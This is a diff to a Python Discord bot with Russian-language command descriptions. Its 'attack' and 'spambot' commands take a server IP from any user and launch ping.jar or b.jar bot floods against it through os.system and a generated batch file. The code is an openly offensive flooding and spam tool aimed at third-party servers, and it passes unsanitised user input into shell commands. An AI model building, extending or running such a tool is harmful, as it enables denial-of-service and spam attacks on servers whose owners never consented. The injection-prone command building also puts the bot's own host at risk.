@@ -19,9 +19,9 @@ testingservers = config.GUILDS
 def attack_server(ip):
     os.system("java -jar ping.jar {}".format(ip))
 
-def attack_server_spambot(ip, message, path_desktop):
+def attack_server_spambot(ip, message):
     ip1, port = ip.split(':', 1)
-    batch = f'@echo off\nstart \"attack\" java -Dip={ip1}:{port} -Xmx1800M -Dmsg=\"{message}\" -jar {path_desktop}\\b.jar\ntimeout /t 80\ntaskkill /im java.exe'
+    batch = f'@echo off\nstart \"attack\" java -Dip={ip1}:{port} -Xmx1800M -Dmsg=\"{message}\" -jar b.jar\ntimeout /t 80\ntaskkill /im java.exe'
     batch_f = pathlib.Path('./attack.bat')
     if batch_f.exists():
         os.remove('./attack.bat')
@@ -114,7 +114,7 @@ async def attack(ctx, ip: Option(str, "Айпи сервера для атаки
 @commands.cooldown(1, 60, commands.BucketType.user)
 async def spambot(ctx, ip: Option(str, "Айпи сервера для атаки"), message: Option(str, "Сообщение которое будут отправлять боты (можно указать команду)")):
     def attack_start():
-       thread = threading.Thread(target=attack_server_spambot, args=(ip,message,pathlib.Path(__file__).parent.resolve(),))
+       thread = threading.Thread(target=attack_server_spambot, args=(ip,message,))
        thread.setDaemon(True)
        thread.start()
     if ":" in ip:
